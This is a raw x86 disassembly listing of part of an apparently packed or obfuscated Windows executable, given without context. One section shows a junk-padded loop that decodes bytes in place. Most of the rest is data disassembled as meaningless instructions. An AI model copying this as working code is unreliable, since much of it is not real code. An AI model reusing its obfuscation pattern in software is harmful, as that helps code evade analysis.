  40389b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40389c:	leave  
  40389d:	jle    0x40385f
  40389f:	into   
  4038a0:	mov    esi,0x86b2f00e
  4038a5:	sti    
  4038a6:	and    al,0x7a
  4038a8:	ds inc ebp
  4038aa:	sbb    edi,ecx
  4038ac:	pop    ds
  4038ad:	jo     0x403899
  4038af:	adc    dh,cl
  4038b1:	mov    BYTE PTR [ebp-0x54],bh
  4038b4:	push   es
  4038b5:	aaa    
  4038b6:	adc    DWORD PTR [ecx],ebp
  4038b8:	dec    ebx
  4038b9:	dec    edx
  4038ba:	lahf   
  4038bb:	call   0xa10e950a
  4038c0:	out    dx,eax
  4038c1:	(bad)  
  4038c2:	loopne 0x403912
  4038c4:	mov    ah,0xb7
  4038c6:	sub    eax,0x33256a7f
  4038cc:	add    DWORD PTR [ebx],ebx
  4038ce:	aas    
  4038cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038d0:	cmp    bh,dh
  4038d2:	jge    0x403892
  4038d4:	loopne 0x403927
  4038d6:	cwde   
  4038d7:	in     al,dx
  4038d8:	or     al,0x6b
  4038da:	les    esp,FWORD PTR [esi]
  4038dc:	xlat   BYTE PTR ds:[ebx]
  4038dd:	jge    0x4038de
  4038df:	mov    eax,0x6da35c4c
  4038e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038e5:	cmp    ebx,ecx
  4038e7:	inc    esi
  4038e8:	loope  0x40389e
  4038ea:	jb     0x4038e0
  4038ec:	jmp    0x2f10bb9f
  4038f1:	and    DWORD PTR [eax+esi*4],edx
  4038f4:	push   eax
  4038f5:	cli    
  4038f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038f7:	inc    esi
  4038f8:	rcl    eax,cl
  4038fa:	sub    eax,0x43563099
  4038ff:	xor    al,0xcd
  403901:	retf   
  403902:	(bad)  [ebx+0x2d81f04d]
  403908:	mov    ecx,0xa100426e
  40390d:	outs   dx,BYTE PTR ds:[esi]
  40390e:	inc    edx
  40390f:	add    BYTE PTR [ebx],dh
  403911:	mov    BYTE PTR [ecx+0x426f2d15],0x0
  403918:	add    eax,0x3300426f
  40391d:	into   
  40391e:	sub    eax,ecx
  403920:	mov    DWORD PTR ds:0x426f15,0x36a1
  40392a:	cmp    edx,eax
  40392c:	jne    0x403b2f
  403932:	mov    eax,DWORD PTR [ebp-0xc]
  403935:	and    DWORD PTR ds:0x426ee1,0x0
  40393f:	jmp    0x403951
  403944:	mov    ecx,DWORD PTR ds:0x426ee1
  40394a:	inc    ecx
  40394b:	mov    DWORD PTR ds:0x426ee1,ecx
  403951:	cmp    DWORD PTR ds:0x426ee1,0x16
  403958:	jae    0x40399f
  40395e:	cmp    DWORD PTR ds:0x426ee1,0xb
  403965:	jge    0x40399f
  40396b:	jmp    0x403980
  403970:	push   0x37fd
  403975:	push   0x426042
  40397a:	call   DWORD PTR ds:0x42fa44
  403980:	cmp    DWORD PTR ds:0x426ee1,0xa
  403987:	jne    0x40399a
  40398d:	mov    ecx,DWORD PTR ds:0x426ee1
  403993:	inc    ecx
  403994:	mov    DWORD PTR ds:0x426ee1,ecx
  40399a:	jmp    0x403944
  40399f:	mov    dl,BYTE PTR [eax+ebx*1+0x801]
  4039a6:	mov    eax,DWORD PTR [ebp-0x28]
  4039a9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039ac:	xor    eax,esi
  4039ae:	and    DWORD PTR ds:0x426f09,0x426e85
  4039b8:	xor    ecx,esi
  4039ba:	adc    DWORD PTR ds:0x426e91,0x426ed5
  4039c4:	add    eax,edi
  4039c6:	sbb    DWORD PTR ds:0x426ef1,0x426e99
  4039d0:	add    ecx,edi
  4039d2:	mov    DWORD PTR ds:0x426ed1,0x117e
  4039dc:	mov    BYTE PTR [ebp-0x21],dl
  4039df:	cmp    eax,ecx
  4039e1:	mov    DWORD PTR ds:0x426ea5,0x5630
  4039eb:	jae    0x403af5
  4039f1:	lea    ecx,[eax-0x3272fa]
  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x42fa18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xf1c4e32d,al
  403bc1:	test   DWORD PTR [eax+0x7b9cf4f6],esp
  403bc7:	jnp    0x403bbd
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	dec    ecx
  403bcd:	mov    ecx,0x99e54316
  403bd2:	or     edi,DWORD PTR [ebp-0x75924009]
  403bd8:	xchg   edx,eax
  403bd9:	adc    ch,ah
  403bdb:	jnp    0x403b68
  403bdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bde:	nop
  403bdf:	mov    esp,0x920f671b
  403be4:	xchg   edi,eax
  403be5:	pusha  
  403be6:	push   0xe7a761af
  403beb:	jmp    0xcb1d41cd
  403bf0:	ins    BYTE PTR es:[edi],dx
  403bf1:	add    esp,DWORD PTR [ecx+0x72368f7d]
  403bf7:	fidivr WORD PTR [esp+ebx*8+0x5d]
  403bfb:	push   esp
  403bfc:	cmp    DWORD PTR [eax],edi
  403bfe:	fimul  WORD PTR [ebx]
  403c00:	adc    al,0xc8
  403c02:	mov    bl,0x61
  403c04:	cs stos BYTE PTR es:[edi],al
  403c06:	bound  esi,QWORD PTR [edi+0x8]
  403c09:	imul   ebp,DWORD PTR [ebx-0x4c],0x16226a41
  403c10:	out    dx,al
  403c11:	cld    
  403c12:	or     eax,0x6ed1fc69
  403c17:	stos   DWORD PTR es:[edi],eax
  403c18:	bound  esi,QWORD PTR [esi-0xed79b80]
  403c1e:	scas   eax,DWORD PTR es:[edi]
  403c1f:	add    BYTE PTR [ecx-0x39],dl
  403c22:	pop    ebp
  403c23:	repnz sub al,0xa
  403c26:	xchg   ebp,eax
  403c27:	mov    ch,0xce
  403c29:	clc    
  403c2a:	or     al,BYTE PTR [ecx]
  403c2c:	mov    bh,0x21
  403c2e:	sub    ecx,DWORD PTR [edi-0x18fddac8]
  403c34:	lods   al,BYTE PTR ds:[esi]
  403c35:	mov    cl,0xa4
  403c37:	test   al,0xe6
  403c39:	dec    esp
  403c3a:	xchg   ecx,eax
  403c3b:	(bad)  
  403c3c:	int    0x6a
  403c3e:	mov    dh,0xe2
  403c40:	mov    ch,0x81
  403c42:	adc    dh,ah
  403c44:	jge    0x403bce
  403c46:	push   es
  403c47:	push   esp
  403c48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c49:	cmp    bh,cl
  403c4b:	fcmovbe st,st(2)
  403c4d:	fcomp  st(4)
  403c4f:	push   DWORD PTR ds:0xca627f9c
  403c55:	sbb    eax,ebx
  403c57:	xor    BYTE PTR [esi+esi*2-0x19855246],bh
  403c5e:	mov    bh,0xb3
  403c60:	cmp    bh,BYTE PTR [esi-0x424f26dc]
  403c66:	pop    ebp
  403c67:	add    DWORD PTR [ecx+0x744d87e1],ebx
  403c6d:	std    
  403c6e:	inc    esi
  403c6f:	xor    al,0xde
  403c71:	stc    
  403c72:	das    
  403c73:	imul   eax,DWORD PTR [edi-0x73],0x43
  403c77:	sub    eax,0x24caa2d
  403c7c:	adc    cl,BYTE PTR [edi-0x72e551ad]
  403c82:	rol    edx,0x47
  403c85:	fisttp WORD PTR [ebx-0xa]
  403c88:	mov    esi,0xc9059027
  403c8d:	les    ecx,FWORD PTR [esi+ebx*1-0x5ba5c15e]
  403c94:	adc    BYTE PTR [ebx+0x2a75ce1b],cl
  403c9a:	inc    ebp
  403c9b:	mov    ebx,DWORD PTR es:[ebp-0x585ce5c5]
  403ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ca3:	dec    dh
  403ca5:	ins    BYTE PTR es:[edi],dx
  403ca6:	not    cl
  403ca8:	and    ebx,DWORD PTR [edi]
  403caa:	pop    esp
  403cab:	je     0x403c67
  403cad:	shl    BYTE PTR [edi],0x12
  403cb0:	mov    BYTE PTR [edi+edx*1-0x32ba409b],ah
  403cb7:	imul   ecx,DWORD PTR [ebx],0xfffffff0
  403cba:	cld    
  403cbb:	test   BYTE PTR [ecx-0x11],ch
  403cbe:	ins    DWORD PTR es:[edi],dx
  403cbf:	daa    
  403cc0:	inc    ebx
  403cc1:	mov    dh,0x82
  403cc3:	rcr    DWORD PTR [esi-0x1c],0xa4
  403cc7:	rcl    DWORD PTR [ecx],cl
  403cc9:	sbb    DWORD PTR [ebp+0x57],edx
  403ccc:	loope  0x403cb5
  403cce:	add    eax,0x758dea62
  403cd3:	call   0x32a616a
  403cd8:	add    dl,0xfb
  403cdb:	out    dx,eax
  403cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cdd:	add    bh,dh
  403cdf:	mov    ebp,0xdbc808b4
  403ce4:	out    dx,al
  403ce5:	xchg   ebx,eax
  403ce6:	sbb    eax,0x2ac27a8e
  403ceb:	pop    ebp
  403cec:	cmp    BYTE PTR [di],0x32
  403cf0:	shl    DWORD PTR [ebp+0x15],1
  403cf3:	aad    0xe4
  403cf5:	mov    ebp,0x515ac354
  403cfa:	imul   esi,DWORD PTR [edx],0x1defdcc0
  403d00:	mov    gs,WORD PTR [esp+ecx*2]
  403d03:	mov    fs,WORD PTR [ecx-0x1e]
  403d06:	test   al,0xa0
  403d08:	push   0x32
  403d0a:	lock icebp 
  403d0c:	xchg   dl,ch
  403d0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d0f:	mov    ebp,0x823accbe
  403d14:	fdivr  st,st(5)
  403d16:	cwde   
  403d17:	test   eax,0x46b17c68
  403d1c:	inc    ecx
  403d1d:	adc    DWORD PTR [edx-0xa],ebp
  403d20:	fmul   st(3),st
  403d22:	out    0x37,al
  403d24:	jl     0x403d6c
  403d26:	cmc    
  403d27:	stos   DWORD PTR es:[edi],eax
  403d28:	push   esi
  403d29:	cmp    ecx,esp
  403d2b:	inc    edx
  403d2c:	push   es
  403d2d:	mov    ebx,?
  403d2f:	xor    eax,0xe8ebdbe1
  403d34:	dec    ecx
  403d35:	pop    ds
  403d36:	fs stc 
  403d38:	daa    
  403d39:	push   0xffffff95
  403d3b:	out    dx,eax
  403d3c:	xchg   DWORD PTR [ebp+0x3a7ca186],edi
  403d42:	jo     0x403d93
  403d44:	(bad)  
  403d45:	fdivp  st(6),st
  403d47:	pop    eax
  403d48:	and    ch,BYTE PTR [edx+0x2]
  403d4b:	ss aas 
  403d4d:	out    0x6f,eax
  403d4f:	retf   0xd118
  403d52:	fstp   TBYTE PTR [bp+0x3b]
  403d56:	mov    dl,0x84
  403d59:	sti    
  403d5a:	add    BYTE PTR ds:0x5b6ed212,0xb
  403d61:	int    0x55
  403d63:	scas   al,BYTE PTR es:[edi]
  403d64:	ficomp DWORD PTR [ebx+eiz*1-0x79d0c36f]
  403d6b:	mov    dl,0x29
  403d6d:	jmp    0x1c95b22b
  403d72:	xchg   ecx,eax
  403d73:	mov    al,ds:0x5fd18ba4
  403d78:	cwde   
  403d79:	dec    esi
  403d7a:	cmp    DWORD PTR [esi],esp
  403d7c:	cwde   
  403d7d:	dec    ebx
  403d7e:	mov    ch,0xbc
  403d80:	sahf   
  403d81:	aad    0x2c
  403d83:	fistp  DWORD PTR [edx-0x7]
  403d86:	push   esi
  403d87:	xor    ah,ch
  403d89:	inc    ebp
  403d8a:	(bad)  
  403d8b:	mov    ch,0x3d
  403d8d:	mov    dl,0x76
  403d8f:	sub    al,0xfd
  403d91:	push   cs
  403d92:	cdq    
  403d93:	ffreep st(7)
  403d95:	(bad)  
  403d96:	lock das 
  403d98:	fcmovnu st,st(2)
  403d9a:	push   es
  403d9b:	cmp    edx,esp
  403d9d:	xor    eax,0x8763408b
  403da2:	inc    ebp
  403da3:	sub    eax,0xb2079d6e
  403da8:	xchg   DWORD PTR [esi+0x3c],ecx
  403dab:	repz daa 
  403dad:	fcom   st(7)
  403daf:	out    dx,al
  403db0:	leave  
  403db1:	or     bh,BYTE PTR [ebx+0x7a00c4a3]
  403db7:	aad    0xaf
  403db9:	test   DWORD PTR es:[ebp-0x35],esi
  403dbd:	mov    bl,0x48
  403dbf:	mov    esp,DWORD PTR [ebp-0x79ab05fd]
  403dc5:	imul   BYTE PTR [esi-0x7b]
  403dc8:	scas   al,BYTE PTR es:[edi]
  403dc9:	pop    ss
  403dca:	jmp    0xaa1605b4
  403dcf:	popa   
  403dd0:	icebp  
  403dd1:	push   ebx
  403dd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dd3:	retf   0x9cc7
  403dd6:	push   ds
  403dd7:	test   eax,0x8fb70050
  403ddc:	or     edi,DWORD PTR [bp-0x557]
  403de1:	pop    edi
  403de2:	lods   al,BYTE PTR ds:[esi]
  403de3:	fsub   DWORD PTR [ebx+edi*4]
  403de6:	xchg   esi,eax
  403de7:	pop    ebx
  403de8:	pop    ebp
  403de9:	fdivrp st(4),st
  403deb:	xor    eax,0x8ffa7319
  403df0:	pushf  
  403df1:	daa    
  403df2:	dec    ebp
  403df3:	pop    es
  403df4:	arpl   WORD PTR [esi+ebp*1+0x1c],sp
  403df8:	xchg   BYTE PTR [edi+0x4e],dl
  403dfb:	cmc    
  403dfc:	mov    eax,ds:0x2b2f00dd
  403e01:	cmp    eax,0xd3bbca0c
  403e06:	push   ds
  403e07:	ins    DWORD PTR es:[edi],dx
  403e08:	sbb    al,0x6a
  403e0a:	add    dl,0xe8
  403e0d:	lds    ecx,FWORD PTR [eax-0x709c96d5]
  403e13:	leave  
  403e14:	aaa    
  403e15:	fwait
  403e16:	sar    BYTE PTR [ebp+0x35],cl
  403e19:	and    al,0x28
  403e1b:	mov    DWORD PTR [edi-0x58],edx
  403e1e:	(bad)  
  403e1f:	lds    edx,FWORD PTR [edi+0x75b59f33]
  403e25:	mov    ebp,0xf83bc37e
  403e2a:	lahf   
  403e2b:	xchg   ebp,eax
  403e2c:	test   eax,0x840dbde1
  403e31:	mov    ds:0x7110fa53,eax
  403e36:	mov    al,ds:0xb169eb00
  403e3b:	cwde   
  403e3c:	mov    DWORD PTR [eax+0x44204b5c],ecx
  403e42:	and    al,0xd0
  403e44:	aad    0x45
  403e46:	aas    
  403e47:	inc    esp
  403e48:	jmp    0x403ec9
  403e4a:	cwde   
  403e4b:	cld    
  403e4c:	push   es
  403e4d:	mov    bl,0x9c
  403e4f:	xchg   ch,ch
  403e51:	scas   al,BYTE PTR es:[edi]
  403e52:	inc    eax
  403e53:	inc    ebx
  403e54:	xor    ecx,DWORD PTR [esi+0x59]
  403e57:	(bad)  
  403e58:	cmp    al,0xb0
  403e5a:	mov    esp,0x7d16da43
  403e5f:	mov    ah,0xaa
  403e61:	adc    BYTE PTR [edi],bl
  403e63:	mov    ebp,?
  403e65:	jb     0x403ee0
  403e67:	lods   eax,DWORD PTR ds:[esi]
  403e68:	outs   dx,DWORD PTR ds:[esi]
  403e69:	xchg   ebx,eax
  403e6a:	and    BYTE PTR [ebx+0x139e9969],ah
  403e70:	out    dx,eax
  403e71:	out    dx,eax
  403e72:	in     eax,dx
  403e73:	xor    al,0xbf
  403e75:	inc    eax
  403e76:	adc    ah,BYTE PTR [ecx]
  403e78:	mov    ds:0x6e8795dc,al
  403e7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e7e:	push   cs
  403e7f:	(bad)  
  403e80:	or     eax,0x3135c2ff
  403e85:	mov    ds:0x3886f237,eax
  403e8a:	or     BYTE PTR [esi+0x49],dh
  403e8d:	mov    eax,0x5b366d9a
  403e92:	clc    
  403e93:	scas   al,BYTE PTR es:[edi]
  403e94:	push   0x4b834a99
  403e99:	(bad)  
  403e9a:	adc    bh,BYTE PTR [ecx]
  403e9c:	xor    DWORD PTR ds:0x5cc844bb,0x6c
  403ea3:	add    DWORD PTR [edx+0x4e9aa5ed],ebp
  403ea9:	ss (bad) 
  403eab:	aam    0x93
  403ead:	(bad)  
  403eae:	frstor [esi]
  403eb0:	sub    eax,0xa8a827fc
  403eb5:	xchg   ebx,eax
  403eb6:	ficomp DWORD PTR [ecx-0x5]
  403eb9:	fimul  DWORD PTR [ecx+0x5780d72e]
  403ebf:	mov    eax,ds:0x41134e0
  403ec4:	imul   ebx,DWORD PTR [ecx-0x50],0x6b1aedfb
  403ecb:	hlt    
  403ecc:	adc    ah,BYTE PTR [ebp+0x652816c0]
  403ed2:	mov    edx,0xc524ab8c
  403ed7:	lods   al,BYTE PTR ds:[esi]
  403ed8:	lods   al,BYTE PTR ds:[esi]
  403ed9:	in     eax,dx
  403eda:	push   cs
  403edb:	xchg   ebp,eax
  403edc:	xor    eax,0x4733e156
  403ee1:	mov    ss,WORD PTR [ebp+0x33726b9f]
  403ee7:	xchg   edx,eax
  403ee8:	pop    ss
  403ee9:	rol    DWORD PTR [edx],cl
  403eeb:	les    esp,FWORD PTR [eax-0x5c66930]
  403ef1:	or     DWORD PTR [ebx+0x259c7bf5],ebp
  403ef7:	sub    cl,BYTE PTR [ebx]
  403ef9:	sahf   
  403efa:	div    BYTE PTR [edi+0x5e]
  403efd:	jno    0x403f00
  403eff:	pop    ebx
  403f00:	cmp    ecx,DWORD PTR [ecx]
  403f02:	xor    al,0x88
  403f04:	mov    al,ds:0x1f2b732d
  403f09:	ficomp DWORD PTR [ecx-0x2a]
  403f0c:	sub    BYTE PTR [ebx+0x66ca107],dl
  403f12:	popf   
  403f13:	cmp    eax,DWORD PTR [ebp+edi*1+0x34dc7ce0]
  403f1a:	jnp    0x403ec9
  403f1c:	js     0x403f32
  403f1e:	sbb    eax,0xbe001223
  403f23:	(bad)  
  403f24:	fldcw  WORD PTR [edx+0x75c975dd]
  403f2a:	mov    esp,0x4e901cc9
  403f2f:	repz push ebx
  403f31:	mov    bh,0xa2
  403f33:	scas   al,BYTE PTR es:[edi]
  403f34:	enter  0x6fc3,0x79
  403f38:	push   ss
  403f39:	shl    BYTE PTR [ebp-0x5c],1
  403f3c:	jmp    0xe001:0x6bd641
  403f43:	mov    al,ds:0x9ebd2f3a
  403f48:	enter  0x30ff,0xff
  403f4c:	dec    edi
  403f4d:	pop    eax
  403f4e:	adc    dl,bh
  403f50:	or     ch,BYTE PTR [ebp-0x27]
  403f53:	push   DWORD PTR [ebp+0x3144d6a3]
  403f59:	adc    esp,ecx
  403f5b:	xor    eax,edx
  403f5d:	cli    
  403f5e:	inc    edx
  403f5f:	ins    DWORD PTR es:[edi],dx
  403f60:	jmp    0x403fda
  403f62:	in     eax,0x21
  403f64:	rcr    BYTE PTR [esi-0x5d7ef88],1
  403f6a:	inc    esi
  403f6b:	jecxz  0x403f93
  403f6d:	test   DWORD PTR [ecx],ecx
  403f6f:	push   es
  403f70:	add    bh,BYTE PTR [ecx-0x77]
  403f73:	scas   eax,DWORD PTR es:[edi]
  403f74:	jae    0x403fcb
  403f76:	xchg   ebp,eax
  403f77:	xchg   ebx,eax
  403f78:	and    ebp,DWORD PTR [ecx]
  403f7a:	arpl   cx,sp
  403f7c:	pop    edi
  403f7d:	sub    BYTE PTR [ebp+0xc],ah
  403f80:	adc    DWORD PTR [ebp+0x2d],edx
  403f83:	clc    
  403f84:	fstp   TBYTE PTR [ecx+0x76cf8422]
  403f8a:	aam    0x65
  403f8c:	add    bh,BYTE PTR [ebp-0x21e28d55]
  403f92:	lods   eax,DWORD PTR ds:[esi]
  403f93:	mov    ecx,fs
  403f95:	pushf  
  403f96:	pop    ebx
  403f97:	rcr    BYTE PTR [edx+0x7c],1
  403f9a:	(bad)  
  403f9c:	(bad)  
  403f9d:	mov    eax,ds:0xce714cf8
  403fa2:	sbb    al,0xf9
  403fa4:	pop    esi
  403fa5:	jns    0x403f37
  403fa7:	cmp    DWORD PTR [edx],edi
  403fa9:	mov    WORD PTR [edi],gs
  403fab:	mov    dh,BYTE PTR [eax-0xf]
  403fae:	mov    ebp,edx
  403fb0:	mov    ?,WORD PTR [edx+0xe]
  403fb3:	bound  ebp,QWORD PTR [esi+0x2f]
  403fb6:	add    eax,DWORD PTR [edx+eiz*1+0x5db0c9a2]
  403fbd:	pushf  
  403fbe:	arpl   WORD PTR [ecx],di
  403fc0:	stos   BYTE PTR es:[edi],al
  403fc1:	aam    0x31
  403fc3:	mov    al,0x2d
  403fc5:	dec    eax
  403fc6:	outs   dx,BYTE PTR ds:[esi]
  403fc7:	je     0x403f52
  403fc9:	sub    BYTE PTR [ebx],dh
  403fcb:	push   ds
  403fcc:	push   ebx
  403fcd:	imul   esp,DWORD PTR [ebx],0xffffffc4
  403fd0:	clc    
  403fd1:	jmp    0x48b0:0x6a74597a
  403fd8:	cmovo  eax,DWORD PTR ds:0xc49a479
  403fdf:	shr    ebx,cl
  403fe1:	or     ebx,DWORD PTR [eax]
  403fe3:	das    
  403fe4:	and    bl,BYTE PTR [ebx]
  403fe6:	mov    WORD PTR [edi+0x18],?
  403fe9:	shl    edi,0x17
  403fec:	and    al,0x69
  403fee:	push   esi
  403fef:	mov    cl,0x78
  403ff1:	mov    ah,0xe2
  403ff3:	push   ds
  403ff4:	xor    BYTE PTR [ebp+edx*1+0x7e],dl
  403ff8:	and    DWORD PTR [ecx+0x584260fd],ecx
  403ffe:	cwde   
  403fff:	test   esp,0x3968b5ec
  404005:	mov    bl,0x56
  404007:	and    BYTE PTR [edx],dl
  404009:	dec    edx
  40400a:	aam    0x28
  40400c:	or     esi,ebx
  40400e:	fsubrp st(3),st
  404010:	add    DWORD PTR [esi-0x36],0x127129e7
  404017:	pop    esp
  404018:	jmp    0x40403e
  40401a:	lods   al,BYTE PTR ds:[esi]
  40401b:	inc    ecx
  40401c:	jne    0x40408e
  40401e:	clc    
  40401f:	mov    dh,cl
  404021:	push   ss
  404022:	sbb    bl,BYTE PTR [ebx+0x4d]
  404025:	push   eax
  404026:	push   cs
  404027:	xor    BYTE PTR [edx+0x44],bh
  40402a:	fdivr  QWORD PTR [ecx+0x7db5e7c5]
  404030:	sbb    eax,0x99e86bc
  404035:	adc    ecx,DWORD PTR ds:[ecx-0x5]
  404039:	jo     0x403fde
  40403b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40403c:	clc    
  40403d:	or     DWORD PTR [esi+0x41],eax
  404040:	iret   
  404041:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404042:	push   es
  404043:	mov    DWORD PTR [esi+0x24f634db],eax
  404049:	hlt    
  40404a:	icebp  
  40404b:	cld    
  40404c:	(bad)  
  40404d:	out    dx,al
  40404e:	popa   
  40404f:	mov    esi,0x9b35afbc
  404054:	add    edx,DWORD PTR [esi-0x1635b0ab]
  40405a:	jg     0x4040d7
  40405c:	scas   eax,DWORD PTR es:[edi]
  40405d:	jb     0x404031
  40405f:	sub    al,0xcf
  404061:	push   ss
  404062:	cmp    eax,DWORD PTR [edx-0x15]
  404065:	mov    cl,0xba
  404067:	outs   dx,DWORD PTR ds:[esi]
  404068:	es pushf 
  40406a:	aaa    
  40406b:	jmp    0xe3d70416
  404070:	mov    dh,0x37
  404072:	sbb    ah,BYTE PTR fs:[ebx]
  404075:	pop    edx
  404076:	les    esp,FWORD PTR [ebx-0x4ce34475]
  40407c:	dec    edx
  40407d:	xor    DWORD PTR [ebx+0x7c],ebp
  404080:	int3   
  404081:	pop    ecx
  404082:	and    bl,BYTE PTR [edi-0x4713ec0]
  404088:	aam    0x89
  40408a:	mov    al,ds:0x6ee9c950
  40408f:	mov    eax,0x8b55cdc1
  404094:	xchg   ecx,eax
  404095:	and    ecx,DWORD PTR [eax+0x4e]
  404098:	cmc    
  404099:	mov    edi,0xb0cb49b4
  40409e:	dec    esp
  40409f:	dec    ecx
  4040a0:	mov    esp,0x67c3cbb1
  4040a5:	test   DWORD PTR [ebx-0x10757593],ebx
  4040ab:	push   esi
  4040ac:	pop    edx
  4040ad:	jmp    0xfda2509a
  4040b2:	inc    edi
  4040b3:	mov    edi,0xdc0b1e58
  4040b8:	shl    BYTE PTR [ecx],0xa1
  4040bb:	pushf  
  4040bc:	cmp    eax,0x4d43220d
  4040c1:	fldenv [eax-0x1]
  4040c4:	fidivr WORD PTR [eax+0x6a]
  4040c7:	(bad)  
  4040c8:	in     eax,0xc3
  4040ca:	dec    edi
  4040cb:	sbb    BYTE PTR [ebx+0x72e125a],al
  4040d1:	mov    esi,0x94935330
  4040d6:	mov    bh,0x68
  4040d8:	push   esp
  4040d9:	in     eax,0x49
  4040db:	add    DWORD PTR [edx+0x29],esp
  4040de:	sahf   
  4040df:	adc    eax,edi
  4040e1:	or     DWORD PTR [edi+0x11f93584],esp
  4040e7:	movntps XMMWORD PTR [ecx-0x5dfc3970],xmm0
  4040ee:	cmp    BYTE PTR [eax+0x2e],bh
  4040f1:	push   ss
  4040f2:	adc    DWORD PTR [edi],ebp
  4040f4:	mov    dl,0xd1
  4040f6:	call   0x7bd:0x9ece6f9c
  4040fd:	fisttp DWORD PTR [ebx]
  4040ff:	mov    WORD PTR [eax-0x23262510],gs
  404105:	xor    DWORD PTR [edi],ebx
  404107:	scas   eax,DWORD PTR es:[edi]
  404108:	dec    esi
  404109:	xor    eax,0x4e29e09b
  40410e:	sahf   
  40410f:	inc    ebp
  404110:	sbb    al,0xc1
